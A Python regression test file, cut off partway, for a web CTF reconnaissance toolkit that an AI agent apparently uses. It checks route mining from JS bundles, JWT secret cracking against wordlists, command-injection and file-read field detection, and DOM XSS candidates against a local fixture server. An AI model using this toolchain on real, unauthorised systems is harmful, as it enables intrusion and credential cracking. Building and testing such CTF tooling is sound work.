#!/usr/bin/env python3
"""test_regression.py — SPA-aware recon regression test.

Two independent test cases:

RegressionTest exercises quickrecon.py, jsharvest.py, jsmine.py and probe.py together
against fixture_app.py, a local HTTP server that serves:
  - the same SPA shell, status 200, for every path it doesn't specifically implement
    (including a handful of admin/api quickcheck guesses)
  - one real JSON endpoint (/api/data) that always answers 401
  - a JS bundle (/app.js) with one GET route carrying a query string and one POST route
  - a second bundle (/mapped.js) advertising a source map whose sourcesContent has one
    node_modules (vendor) entry and one app entry containing a narrative hint sentence —
    mirrors the Necromancer lab's AdminPanel.js finding
  - a public object endpoint (/api/objects/1) that always answers an identical JSON 404,
    with or without authentication

Asserts:
  - the meta/quickcheck fallback guesses produce zero hits (all suppressed as the
    calibrated SPA signature)
  - /api/data is the only survivor of the quickcheck candidate list
  - the JS-mined GET/POST routes land in recon/methods.txt
  - probe.py classifies /api/objects/1 as public-error (not a leak) and /api/data as
    auth-required
  - jsharvest.py explodes the map's sourcesContent to src/, vendor excluded
  - jsmine.py's HINT TEXT section surfaces the narrative sentence

JwtquickWordlistChainTest exercises jwtquick.py's default two-stage crack (JWT-specific
list, then auto-escalate to rockyou on a miss) against tiny temp-file stand-ins for both
wordlists, swapped in via SECLISTS/ROCKYOU env overrides — no dependency on, or runtime
anywhere near, the real 104k/14M-line lists. Asserts:
  - a secret present only in the (fixture) rockyou list is still found by default
  - --wordlist pins a single list and does not fall through to the other

JsmineDynamicRoutesTest guards the DYNAMIC ROUTES (.concat) matcher against the same
adjacent-match-swallowing regression fixed once already in METHOD -> PATH (commit
54d1701): a plain-group tail capture extends its own match's consumed span, so two
.concat() calls separated only by a comma let the first match eat the second call site
whole. No HTTP fixture needed — jsmine.py mines local files directly.

The remaining classes below were merged from the Codex mirror's black-box harness
regressions (tests/test_harness_regression.py in ~/.codex/skills/web-ctf) when its
fixes were ported into this repo's scripts: quote/depth-aware .concat() argument
parsing and template-literal mining in jsmine.py, skipped-write reporting in
probe.py, the deny-baseline gate in jwtquick.py, byte-identical asset reuse in
jsharvest.py, and feroxbuster progress capture in ctf-init.sh. Reused this repo's
fixture_app.py server and make_jwt() helper instead of Codex's ad hoc inline
HTTP server, so there is one fixture per HTTP-backed concern instead of two.

A second batch (ProbePublicAuthEnvelopeTest, JsmineSecretSentinelTest,
FlaghookHealthMarkerTest, and the quickcheck_hits.txt assertion added to
test_ctf_init_captures_ferox_progress_in_ferox_log) was ported the same way
after a live run against Shady Oaks Financial: probe.py mislabeled a public
forgot-password envelope as a leak and printed CORS policy as route-specific
Allow, jsmine.py flagged React's runtime sentinel as an application secret,
flaghook.py had no way to prove PostToolUse was actually invoking it, and
ctf-init.sh's quickcheck job never reached /api/stocks/search because /api
itself is the SPA fallback.

Run directly: python3 tests/test_regression.py
"""
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
from urllib.parse import parse_qs, urlparse

import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fixture_app

SCRIPTS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts")


def run(script, *args, timeout=60, env=None):
    cmd = [sys.executable, os.path.join(SCRIPTS, script)] + list(args)
    run_env = {**os.environ, **env} if env else None
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=run_env)
    return p.stdout + p.stderr


def run_full(script, *args, timeout=60, env=None, input_text=None):
    """Like run(), but returns the CompletedProcess so callers can assert on
    returncode as well as output — needed for the exit-code contracts added to
    jwtquick.py (2 = inconclusive), probe.py (1 = no non-write targets given),
    and flaghook.py (2 = flag detected)."""
    cmd = [sys.executable, os.path.join(SCRIPTS, script)] + list(args)
    run_env = {**os.environ, **env} if env else None
    return subprocess.run(cmd, input=input_text, capture_output=True, text=True,
                          timeout=timeout, env=run_env)


def make_jwt(payload, secret):
    """Same signing scheme as jwtquick.py's own sign(), kept independent on purpose —
    this is a black-box test and should not import the module it's exercising."""
    import base64, hashlib, hmac, json as _json
    b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
    h = b64e(_json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64e(_json.dumps(payload, separators=(",", ":")).encode())
    s = b64e(hmac.new(secret.encode(), h + b"." + p, hashlib.sha256).digest())
    return (h + b"." + p + b"." + s).decode()


class RegressionTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_quickrecon_suppresses_fallback_and_finds_the_real_endpoint(self):
        with tempfile.TemporaryDirectory() as tmp:
            hitfile = os.path.join(tmp, "quickcheck_hits.txt")
            out = run("quickrecon.py", "--base", self.base_url, "--out", os.path.join(tmp, "probe"),
                      "--hitfile", hitfile, "--paths",
                      "robots.txt", "sitemap.xml", "admin", "api", "graphql", "api/data")

            self.assertTrue(os.path.isfile(os.path.join(tmp, "probe", "fallback.txt")),
                             "calibration response was not saved:\n" + out)

            hits = []
            if os.path.isfile(hitfile):
                with open(hitfile, encoding="utf-8") as fh:
                    hits = [l.strip() for l in fh if l.strip()]
            self.assertEqual(len(hits), 1,
                              "expected exactly one survivor of the quickcheck guesses, got %r\n%s"
                              % (hits, out))
            self.assertIn("/api/data", hits[0])
            self.assertTrue(hits[0].startswith("401 "), "expected the 401 status: %r" % hits[0])

    def test_quickrecon_discovers_post_only_action_endpoint(self):
        """GET /api/account/recover is the SPA fallback, while POST {} reaches
        a validation error. Method fallback must preserve that route as POST."""
        with tempfile.TemporaryDirectory() as tmp:
            methodfile = os.path.join(tmp, "methods.txt")
            proc = run_full(
                "quickrecon.py", "--base", self.base_url,
                "--out", os.path.join(tmp, "probe"), "--discover-methods",
                "--methodfile", methodfile, "--delay", "0", "--paths",
                "api/account/recover")
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            with open(methodfile, encoding="utf-8") as fh:
                methods = fh.read()
            self.assertRegex(methods, r'POST\s+/api/account/recover',
                             "POST-only action route was missed:\n" + proc.stdout)

    def test_quickrecon_discovers_post_only_magic_link_endpoint(self):
        """Magic-link routes are state-changing auth actions even when GET is
        the SPA fallback, so safe method discovery must still try POST {}."""
        with tempfile.TemporaryDirectory() as tmp:
            methodfile = os.path.join(tmp, "methods.txt")
            proc = run_full(
                "quickrecon.py", "--base", self.base_url,
                "--out", os.path.join(tmp, "probe"), "--discover-methods",
                "--methodfile", methodfile, "--delay", "0", "--paths",
                "api/auth/magic-link/request")
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            with open(methodfile, encoding="utf-8") as fh:
                methods = fh.read()
            self.assertRegex(methods, r'POST\s+/api/auth/magic-link/request',
                             "POST-only magic-link route was missed:\n" + proc.stdout)

    def test_jsharvest_extracts_methods_from_the_bundle(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = run("jsharvest.py", "--base", self.base_url, "--out", tmp)

            methods_path = os.path.join(tmp, "methods.txt")
            self.assertTrue(os.path.isfile(methods_path), "methods.txt was not written:\n" + out)
            with open(methods_path, encoding="utf-8") as fh:
                methods = fh.read()

            self.assertRegex(methods, r'GET\s+/api/data\?limit=10')
            self.assertRegex(methods, r'GET\s+/api/post/image\?file=\{\.\.\.\}',
                             "DOM resource GET was not promoted into methods.txt:\n" + out)
            self.assertRegex(methods, r'POST\s+/api/submit')
            self.assertRegex(methods, r'POST\s+/api/graphql')

            jsmine_path = os.path.join(tmp, "jsmine.txt")
            self.assertTrue(os.path.isfile(jsmine_path), "jsmine.txt was not written:\n" + out)
            with open(jsmine_path, encoding="utf-8") as fh:
                mined = fh.read()
            self.assertIn("FILE-READ FIELD SIGNALS", mined)
            self.assertRegex(
                mined, r'GET\s+/api/post/image\?file=\{\.\.\.\} '
                r'location=query field=file seed=<dynamic>')

    def test_jsharvest_rejects_http_error_bodies_as_bundles(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = run("jsharvest.py", "--base", self.base_url, "--out", tmp)

            self.assertFalse(os.path.exists(os.path.join(tmp, "missing.js")),
                             "a 404 body must never be saved as a JavaScript bundle:\n" + out)
            self.assertFalse(os.path.exists(os.path.join(tmp, "json.js")),
                             "a JSON error must never be saved as a JavaScript bundle:\n" + out)
            self.assertIn("skipping", out)
            self.assertIn("HTTP 404", out)

    def test_jsharvest_crawls_rendered_forms_into_method_map(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = run("jsharvest.py", "--base", self.base_url, "--out", tmp,
                      "--crawl-pages")

            with open(os.path.join(tmp, "methods.txt"), encoding="utf-8") as fh:
                methods = fh.read()
            self.assertRegex(methods, r'POST\s+/api/auth/login',
                             "server-rendered form action was not mined:\n" + out)

    def test_jsharvest_quarantines_dynamic_links_without_requesting_them(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = run("jsharvest.py", "--base", self.base_url, "--out", tmp,
                      "--crawl-pages")
            dynamic_path = os.path.join(tmp, "dynamic-links.txt")
            with open(dynamic_path, encoding="utf-8") as fh:
                dynamic = fh.read()
            self.assertIn('/jobs/${job.id}/applicants', dynamic)
            page_files = os.listdir(os.path.join(tmp, "pages"))
            self.assertEqual(page_files, ["page-001.html"],
                             "literal JS href was fetched as a page:\n" + out)

    def test_probe_classifies_public_error_and_auth_required_correctly(self):
        with tempfile.TemporaryDirectory() as tmp:
            paths_file = os.path.join(tmp, "paths.txt")
            with open(paths_file, "w", encoding="utf-8") as fh:
                fh.write("GET /api/data\n")
                fh.write("GET /api/objects/1\n")

            out = run("probe.py", "--base", self.base_url, "--token", "faketoken",
                      "--paths", paths_file, "--out", os.path.join(tmp, "probe_out"))

            data_line = next((l for l in out.splitlines() if re.match(r'^GET\s+/api/data\b', l)), None)
            objects_line = next((l for l in out.splitlines() if re.match(r'^GET\s+/api/objects/1\b', l)), None)

            self.assertIsNotNone(data_line, "no output line for /api/data:\n" + out)
            self.assertIn("auth-required", data_line)

            self.assertIsNotNone(objects_line, "no output line for /api/objects/1:\n" + out)
            self.assertIn("public-error", objects_line)
            self.assertNotIn("NO-AUTH", objects_line, "public-error must not be counted as a leak")

    def test_jsharvest_explodes_sourcemap_to_src_tree_vendor_excluded(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = run("jsharvest.py", "--base", self.base_url, "--out", tmp)

            admin_panel = os.path.join(tmp, "src", "components", "AdminPanel.js")
            self.assertTrue(os.path.isfile(admin_panel),
                             "sourcesContent was not exploded to src/:\n" + out)
            with open(admin_panel, encoding="utf-8") as fh:
                self.assertIn("correcthorse", fh.read())

            vendor_dir = os.path.join(tmp, "src", "node_modules")
            self.assertFalse(os.path.isdir(vendor_dir),
                              "vendor/node_modules sources must be excluded from extraction")
            self.assertTrue(os.path.isfile(os.path.join(tmp, "vendor", "socket.io.js")),
                            "known vendor bundle was not quarantined")
            with open(os.path.join(tmp, "source-provenance.tsv"), encoding="utf-8") as fh:
                provenance = fh.read()
            self.assertIn("source\tvendor", provenance)
            self.assertIn("socket.io-client", provenance)
            mined = run("jsmine.py", tmp)
            self.assertNotIn("socket.io vendor admin comment", mined,
                             "quarantined vendor source leaked back into application mining")
            dom_xss = re.search(
                r'=== DOM XSS CANDIDATES.*?(?=\n===|\Z)', mined, re.S)
            self.assertIsNotNone(dom_xss, mined)
            self.assertIn("source=location.hash sink=innerHTML expression=fragment", dom_xss.group(0))
            self.assertIn("origin=src/components/AdminPanel.js", dom_xss.group(0))

    def test_jsmine_surfaces_narrative_hint_text(self):
        with tempfile.TemporaryDirectory() as tmp:
            run("jsharvest.py", "--base", self.base_url, "--out", tmp)
            out = run("jsmine.py", tmp)

            self.assertIn("HINT TEXT", out)
            self.assertIn("correcthorse", out,
                          "a plain-English hint sentence (not code-shaped) should surface here:\n" + out)

    def test_ctf_init_preserves_worklog_and_harvests_public_forms(self):
        with tempfile.TemporaryDirectory() as tmp:
            challenge = "fixture-resume"
            workdir = os.path.join(tmp, challenge)
            os.makedirs(workdir)
            worklog = os.path.join(workdir, "WORKLOG.md")
            with open(worklog, "w", encoding="utf-8") as fh:
                fh.write("sentinel live lead\n")

            fake_bin = os.path.join(tmp, "bin")
            os.makedirs(fake_bin)
            ferox = os.path.join(fake_bin, "feroxbuster")
            with open(ferox, "w", encoding="utf-8") as fh:
                fh.write("#!/bin/sh\nexit 0\n")
            os.chmod(ferox, 0o755)

            env = {**os.environ, "CTF_ROOT": tmp, "SECLISTS": tmp,
                   "PATH": fake_bin + os.pathsep + os.environ.get("PATH", "")}
            p = subprocess.run(
                ["bash", os.path.join(SCRIPTS, "ctf-init.sh"), self.base_url,
                 challenge, "bugforge"], capture_output=True, text=True,
                timeout=30, env=env)
            out = p.stdout + p.stderr
            self.assertEqual(p.returncode, 0, out)
            with open(worklog, encoding="utf-8") as fh:
                self.assertEqual(fh.read(), "sentinel live lead\n",
                                 "ctf-init rerun overwrote the durable worklog:\n" + out)
            with open(os.path.join(workdir, "recon", "methods.txt"), encoding="utf-8") as fh:
                methods = fh.read()
            self.assertRegex(methods, r'POST\s+/api/auth/login', out)
            graphql_endpoints = os.path.join(workdir, "recon", "graphql-endpoints.txt")
            with open(graphql_endpoints, encoding="utf-8") as fh:
                self.assertEqual(fh.read().strip(), "/api/graphql")
            self.assertIn("GraphQL route mapped: /api/graphql", out)
            self.assertIn("graphqlquick.py --url", out)
            cmdi_signals = os.path.join(workdir, "recon", "cmdi-signals.txt")
            with open(cmdi_signals, encoding="utf-8") as fh:
                signals = fh.read()
            self.assertIn(
                'POST   /api/roll location=json field=rollOptions seed="none"', signals)
            self.assertIn("Command-injection-shaped request fields mined", out)
            self.assertIn("cmdiquick.py --url", out)
            lfi_signals = os.path.join(workdir, "recon", "lfi-signals.txt")
            with open(lfi_signals, encoding="utf-8") as fh:
                signals = fh.read()
            self.assertIn(
                "GET    /api/post/image?file={...} location=query field=file", signals)
            self.assertIn("File-read-shaped query fields mined", out)
            self.assertIn("lfiquick.py --url", out)

    def test_ctf_init_captures_ferox_progress_in_ferox_log(self):
        """feroxbuster's own -q/--silent flags still leave a startup banner and
        per-hit lines on stdout; ctf-init.sh must redirect that into recon/ferox.log
        (not the retained session's own stdout) so a long-running session stays
        readable, while still summarizing pass/fail and a failure tail inline.

        Also covers the quickcheck job's direct protected-leaf guesses: /api itself
        is the SPA fallback here, so a recursive fuzzer never reaches a nested leaf
        like /api/stocks/search -- only a direct guess against its unauthenticated
        401 existence oracle finds it."""
        with tempfile.TemporaryDirectory() as tmp:
            challenge = "fixture-ferox-log"
            fake_bin = os.path.join(tmp, "bin")
            os.makedirs(fake_bin)
            ferox = os.path.join(fake_bin, "feroxbuster")
            with open(ferox, "w", encoding="utf-8") as fh:
                fh.write("#!/bin/sh\n")
                fh.write("out=''\n")
                fh.write("while [ $# -gt 0 ]; do\n")
                fh.write("  if [ \"$1\" = '-o' ]; then shift; out=\"$1\"; fi\n")
                fh.write("  shift\n")
                fh.write("done\n")
                fh.write("echo FEROX_PROGRESS_NOISE\n")
                fh.write("echo '200      GET       10l       20w      300c http://fixture/health' > \"$out\"\n")
            os.chmod(ferox, 0o755)
            wordlist = os.path.join(
                tmp, "Discovery", "Web-Content", "raft-medium-directories.txt")
            os.makedirs(os.path.dirname(wordlist))
            with open(wordlist, "w", encoding="utf-8") as fh:
                fh.write("health\n")

            env = {**os.environ, "CTF_ROOT": tmp, "SECLISTS": tmp,
                   "PATH": fake_bin + os.pathsep + os.environ.get("PATH", "")}
            p = subprocess.run(
                ["bash", os.path.join(SCRIPTS, "ctf-init.sh"), self.base_url,
                 challenge, "bugforge"], capture_output=True, text=True,
                timeout=30, env=env)
            out = p.stdout + p.stderr
            self.assertEqual(p.returncode, 0, out)
            self.assertNotIn("FEROX_PROGRESS_NOISE", out,
                             "feroxbuster's live progress leaked into ctf-init.sh's own "
                             "terminal/session output instead of staying in ferox.log:\n" + out)
            log_path = os.path.join(tmp, challenge, "recon", "ferox.log")
            with open(log_path, encoding="utf-8") as fh:
                self.assertIn("FEROX_PROGRESS_NOISE", fh.read(),
                             "feroxbuster's progress must still be captured in recon/ferox.log")

            quickcheck_hits = os.path.join(tmp, challenge, "recon", "quickcheck_hits.txt")
            with open(quickcheck_hits, encoding="utf-8") as fh:
                quick_hits = fh.read()
                self.assertIn("/api/stocks/search", quick_hits,
                             "direct protected-leaf guess missing from quickcheck_hits.txt -- "
                             "recursive fuzzing alone cannot reach a leaf below an SPA-fallback "
                             "/api, so ctf-init.sh's quickcheck job must guess it directly")
                self.assertIn("/api/auth/inbox", quick_hits,
                              "public auth-artifact inbox missing from direct quickcheck guesses")
            self.assertNotIn("0\n0 hits", out,
                             "empty grep count printed two zeroes instead of one")

    def test_ctf_init_skips_missing_ferox_wordlist_loudly(self):
        with tempfile.TemporaryDirectory() as tmp:
            challenge = "fixture-ferox-missing-wordlist"
            fake_bin = os.path.join(tmp, "bin")
            os.makedirs(fake_bin)
            marker = os.path.join(tmp, "ferox-was-run")
            ferox = os.path.join(fake_bin, "feroxbuster")
            with open(ferox, "w", encoding="utf-8") as fh:
                fh.write("#!/bin/sh\n")
                fh.write("touch \"$FEROX_MARKER\"\n")
            os.chmod(ferox, 0o755)
            missing_root = os.path.join(tmp, "missing-seclists")
            env = {**os.environ, "CTF_ROOT": tmp, "SECLISTS": missing_root,
                   "FEROX_MARKER": marker,
                   "PATH": fake_bin + os.pathsep + os.environ.get("PATH", "")}
            proc = subprocess.run(
                ["bash", os.path.join(SCRIPTS, "ctf-init.sh"), self.base_url,
                 challenge, "bugforge"], capture_output=True, text=True,
                timeout=30, env=env)
            out = proc.stdout + proc.stderr
            expected = os.path.join(
                missing_root, "Discovery", "Web-Content", "raft-medium-directories.txt")
            self.assertEqual(proc.returncode, 0, out)
            self.assertIn("wordlist missing: " + expected, out)
            self.assertFalse(os.path.exists(marker),
                             "feroxbuster ran despite a nonexistent -w path")
            log_path = os.path.join(tmp, challenge, "recon", "ferox.log")
            with open(log_path, encoding="utf-8") as fh:
                self.assertIn("SKIPPED: wordlist missing: " + expected, fh.read())

    def test_ctf_init_isolates_reprovisioned_instances_and_updates_current_state(self):
        with tempfile.TemporaryDirectory() as tmp:
            challenge = "fixture-reprovision"
            fake_bin = os.path.join(tmp, "bin")
            os.makedirs(fake_bin)
            ferox = os.path.join(fake_bin, "feroxbuster")
            with open(ferox, "w", encoding="utf-8") as fh:
                fh.write("#!/bin/sh\nexit 0\n")
            os.chmod(ferox, 0o755)
            env = {**os.environ, "CTF_ROOT": tmp, "SECLISTS": tmp,
                   "PATH": fake_bin + os.pathsep + os.environ.get("PATH", "")}
            targets = [self.base_url, self.base_url + "/alternate-instance"]
            outputs = []
            for target in targets:
                proc = subprocess.run(
                    ["bash", os.path.join(SCRIPTS, "ctf-init.sh"), target,
                     challenge, "bugforge"], capture_output=True, text=True,
                    timeout=30, env=env)
                self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
                outputs.append(proc.stdout + proc.stderr)

            workdir = os.path.join(tmp, challenge)
            with open(os.path.join(workdir, "state", "current.json"), encoding="utf-8") as fh:
                current = json.load(fh)
            self.assertEqual(current["target"], targets[1])
            self.assertTrue(os.path.islink(os.path.join(workdir, "current")))
            instances = [name for name in os.listdir(os.path.join(workdir, "instances"))
                         if os.path.isdir(os.path.join(workdir, "instances", name))]
            self.assertEqual(len(instances), 2, instances)
            with open(os.path.join(workdir, "WORKLOG.md"), encoding="utf-8") as fh:
                worklog = fh.read()
            self.assertIn("## Reprovisioned", worklog)
            self.assertIn("**Previous target:** " + targets[0], worklog)
            self.assertIn("**Current target:** " + targets[1], worklog)
            expected_hook = os.path.join(workdir, "state", "flaghook-expected.txt")
            self.assertTrue(os.path.isfile(expected_hook))
            self.assertIn("Previous flag-hook sentinel was not observed", outputs[1])
            self.assertIn("Next-call sentinel check", outputs[1])


class JwtquickWordlistChainTest(unittest.TestCase):
    """jwtquick.py's default crack is a two-stage chain: the JWT-specific list first,
    then an automatic rockyou escalation only on a miss. Both lists are swapped for tiny
    temp fixtures via SECLISTS/ROCKYOU env overrides so this doesn't depend on — or take
    anywhere near as long as — the real 104k/14M-line lists."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        seclists = os.path.join(self.tmp.name, "seclists")
        os.makedirs(os.path.join(seclists, "Passwords"))
        with open(os.path.join(seclists, "Passwords", "scraped-JWT-secrets.txt"), "w") as fh:
            fh.write("changeme\nsecret\nyour-256-bit-secret\n")  # deliberately missing our secret
        rockyou = os.path.join(self.tmp.name, "rockyou.txt")
        with open(rockyou, "w") as fh:
            fh.write("123456\npassword\ncorrecthorse\nletmein\n")  # our secret IS in here
        self.env = {"SECLISTS": seclists, "ROCKYOU": rockyou}

    def test_default_chain_misses_jwt_list_then_finds_it_in_rockyou(self):
        token = make_jwt({"id": 1, "role": "user"}, "correcthorse")
        out = run("jwtquick.py", "--token", token, env=self.env)

        self.assertIn("no hit", out, "expected the JWT-specific stage to miss first:\n" + out)
        self.assertIn("escalating to rockyou", out, "chain did not auto-escalate:\n" + out)
        self.assertIn("SECRET = 'correcthorse'", out, "rockyou stage did not find it:\n" + out)

    def test_explicit_wordlist_skips_the_chain(self):
        # secret is only in the (fixture) rockyou list; pinning --wordlist to the
        # JWT-specific list only must NOT silently fall through to rockyou
        token = make_jwt({"id": 1, "role": "user"}, "correcthorse")
        jwt_list = os.path.join(self.tmp.name, "seclists", "Passwords", "scraped-JWT-secrets.txt")
        out = run("jwtquick.py", "--token", token, "--wordlist", jwt_list, env=self.env)

        self.assertIn("no hit", out)
        self.assertNotIn("escalating to rockyou", out,
                          "--wordlist must pin a single list, not chain:\n" + out)
        self.assertNotIn("SECRET =", out)

    def test_missing_explicit_wordlist_is_loud_and_inconclusive(self):
        token = make_jwt({"id": 1, "role": "user"}, "correcthorse")
        missing = os.path.join(self.tmp.name, "does-not-exist.txt")
        proc = run_full("jwtquick.py", "--token", token, "--wordlist", missing,
                        env=self.env)
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        self.assertIn("wordlist not found: " + missing, proc.stdout)
        self.assertIn("secret-crack coverage INCOMPLETE", proc.stdout)


class JsmineDynamicRoutesTest(unittest.TestCase):
    """DYNAMIC ROUTES (.concat) must not lose a call site to a comma-adjacent neighbor.
    METHOD -> PATH already uses a lookahead for this same shape and would find both
    routes independently, so this checks the DYNAMIC ROUTES section specifically —
    scoping to the whole output would let a regression here hide behind that pass."""

    def test_adjacent_concat_calls_both_survive(self):
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "bundle.js"), "w", encoding="utf-8") as fh:
                fh.write('a.get("/api/one/".concat(one)),a.get("/api/two/".concat(two));')

            out = run("jsmine.py", tmp)

            section = re.search(r'=== DYNAMIC ROUTES \(\.concat\).*?(?=\n===|\Z)', out, re.S)
            self.assertIsNotNone(section, "DYNAMIC ROUTES section missing:\n" + out)
            body = section.group(0)
            self.assertIn("/api/one/{one}", body,
                          "first concat call missing from DYNAMIC ROUTES:\n" + out)
            self.assertIn("/api/two/{two}", body,
                          "second concat call was swallowed by the first match's tail "
                          "capture -- DYNAMIC ROUTES matcher regressed:\n" + out)


JSMINE_ROUTE_BUNDLE = r'''
axios.get(`/api/snippets/${id}/comments`);
a.post("/api/snippets/".concat(id,"/comments"));
a.delete("/api/snippets/".concat(id,"/like"));
a.get("/api/admin/posts".concat("?search=",term));
a.get("/api/one/".concat(one)),a.get("/api/two/".concat(two));
//# sourceMappingURL=app.js.map
'''


class JsmineRouteExtractionTest(unittest.TestCase):
    """A regex split on .concat()'s first ')' only ever saw a bare {arg} placeholder,
    so a fixed literal suffix like "/comments" or "/like" was dropped, template-literal
    call sites (axios.get(`/api/x/${id}`)) were never mined at all, and a query-string
    builder ("?search=".concat(term)) rendered as an unprobeable {...} instead of a
    live ?search=probe value. Fixed by a quote/depth-aware argument scanner
    (parse_call_args/concat_route in jsmine.py)."""

    def test_preserves_template_and_concat_suffixes(self):
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "bundle.js"), "w", encoding="utf-8") as fh:
                fh.write(JSMINE_ROUTE_BUNDLE)
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            section = re.search(r'=== METHOD -> PATH.*?(?=\n===|\Z)', proc.stdout, re.S)
            self.assertIsNotNone(section, proc.stdout)
            body = section.group(0)
            self.assertIn("=== METHOD -> PATH (6) ===", body)
            self.assertIn("GET    /api/snippets/{...}/comments", body,
                         "template-literal HTTP call was not mined:\n" + body)
            self.assertIn("POST   /api/snippets/{...}/comments", body,
                         "fixed .concat() suffix '/comments' was not preserved:\n" + body)
            self.assertIn("DELETE /api/snippets/{...}/like", body,
                         "fixed .concat() suffix '/like' was not preserved:\n" + body)
            self.assertIn("GET    /api/admin/posts?search=probe", body,
                         "query-string .concat() builder was not rendered as a probeable "
                         "value:\n" + body)
            self.assertIn("GET    /api/one/{...}", body)
            self.assertIn("GET    /api/two/{...}", body,
                         "second of two comma-adjacent .concat() calls was swallowed:\n" + body)

    def test_concat_depth_aware_nested_arguments(self):
        """A comma buried inside a nested call or array literal must not fracture
        the top-level argument list, and an id wrapped in encodeURIComponent(...)
        must not truncate the trailing literal suffix."""
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "bundle.js"), "w", encoding="utf-8") as fh:
                fh.write('a.get("/api/nested/".concat(["a","b"].join(","), "/details"));\n'
                        'a.get("/api/enc/".concat(encodeURIComponent(id), "/edit"));\n')
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            section = re.search(r'=== METHOD -> PATH.*?(?=\n===|\Z)', proc.stdout, re.S)
            self.assertIsNotNone(section, proc.stdout)
            body = section.group(0)
            self.assertIn("GET    /api/nested/{...}/details", body,
                         "comma inside a nested array/call fractured the argument list:\n" + body)
            self.assertIn("GET    /api/enc/{...}/edit", body,
                         "encodeURIComponent(...) wrapper broke suffix extraction:\n" + body)


class JsmineSectionHeaderCountTest(unittest.TestCase):
    """Section headers must count the unique lines actually displayed. jsmine dedupes
    for display (sorted(set(items))) but used to count len(items) before dedup, so a
    route matched twice (e.g. named in both a minified bundle and its exploded source
    map) inflated the header past what was actually printed."""

    def test_duplicate_matches_collapse_to_one_and_header_agrees(self):
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "bundle.js"), "w", encoding="utf-8") as fh:
                fh.write('a.get("/api/dup");\na.get("/api/dup");\na.get("/api/other");\n')
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            section = re.search(r'=== METHOD -> PATH.*?(?=\n===|\Z)', proc.stdout, re.S)
            self.assertIsNotNone(section, proc.stdout)
            body = section.group(0)
            self.assertIn("=== METHOD -> PATH (2) ===", body, body)
            displayed = [l for l in body.splitlines()[1:] if l.strip()]
            self.assertEqual(len(displayed), 2,
                             "header count must equal the number of lines actually shown:\n" + body)


class JsmineSecretSentinelTest(unittest.TestCase):
    """React's runtime sentinel value (SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED,
    injected by react-dom to catch code that reads its internal shared state) matches
    the SECRETS regex's generic key=value shape and isn't an application secret.
    jsmine.py flagged it as one on the Shady Oaks Financial bundle. Filtering it out
    must stay narrow enough that a genuine api_secret="pumpkin"-style value survives."""

    def test_jsmine_filters_react_secret_sentinel_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "bundle.js"), "w", encoding="utf-8") as fh:
                fh.write('const secret="SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED";\n')
                fh.write('const api_secret="pumpkin";\n')
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            section = re.search(r'=== SECRETS.*?(?=\n===|\Z)', proc.stdout, re.S)
            self.assertIsNotNone(section, proc.stdout)
            body = section.group(0)
            self.assertIn("=== SECRETS (1) ===", body)
            self.assertIn("pumpkin", body)
            self.assertNotIn("DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED", body)


class JsmineAuthLifecycleRankingTest(unittest.TestCase):
    """Token sinks and first-use lifecycle routes must rank above ordinary
    login/register calls instead of disappearing from the action section."""

    def test_magic_claim_and_inbox_routes_are_ranked(self):
        with tempfile.TemporaryDirectory() as tmp:
            source = os.path.join(tmp, "auth.js")
            with open(source, "w", encoding="utf-8") as fh:
                fh.write('a.post("/api/auth/magic-link/request", {});\n')
                fh.write('a.post("/api/auth/claim", {});\n')
                fh.write('a.get("/api/auth/inbox");\n')
            proc = run_full("jsmine.py", source)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertRegex(
                proc.stdout, r'score=100 POST\s+/api/auth/magic-link/request')
            self.assertRegex(proc.stdout, r'score=100 POST\s+/api/auth/claim')
            self.assertRegex(proc.stdout, r'score=110 GET\s+/api/auth/inbox')


class JsmineCommandInjectionSignalsTest(unittest.TestCase):
    """The DiceForge field was visible in a direct axios body but the old miner
    emitted only method/path. Transport-specific field signals must retain the
    route, location, literal seed when available, and source provenance without
    claiming that the candidate is already vulnerable."""

    def test_json_query_form_header_path_and_multipart_candidates_are_ranked(self):
        source_text = r'''
axios.post('/api/roll', { dice: dicePayload, rollOptions: 'none' });
fetch('/api/ping?host=localhost', { method: 'GET' });
fetch(`/api/tools/${hostname}`, { method: 'GET', headers: { 'X-Diagnostic-Host': 'local' } });
fetch('/api/check', { method: 'POST', body: new URLSearchParams({ host: 'localhost', mode: 'fast' }) });
const markup = '<form action="/upload" method="post" enctype="multipart/form-data"><input name="filename"></form>';
'''
        with tempfile.TemporaryDirectory() as tmp:
